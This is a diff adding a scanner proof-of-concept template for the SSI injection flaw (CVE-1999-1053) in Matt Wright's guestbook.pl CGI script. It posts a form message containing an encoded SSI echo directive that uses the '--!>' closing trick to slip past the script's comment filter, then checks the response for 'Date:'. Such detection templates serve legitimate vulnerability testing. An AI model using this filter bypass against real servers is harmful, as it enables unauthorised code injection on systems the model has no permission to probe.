@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过 POST 请求向 guestbook.pl 提交包含绕过过滤的 SSI 指令，验证服务器端包含注入漏洞。使用替代闭合序列 --!> 绕过 <!-- 与 --> 之间的过滤机制。"
+id = "POC-AVE-1999-1686"
+name = "Matt Wright Guestbook.pl SSI Command Injection PoC"
+severity = "high"
+tags = ["ave-1999-1686"]
+vuln_id = [
+    "CVE-1999-1053",
+    "AVE-1999-1686",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/guestbook.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "realname=test&username=user&url=http://example.com&city=city&state=state&message=%3C%21--%23echo+var%3D%22DATE_LOCAL%22+--%21%3E"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Date:"]
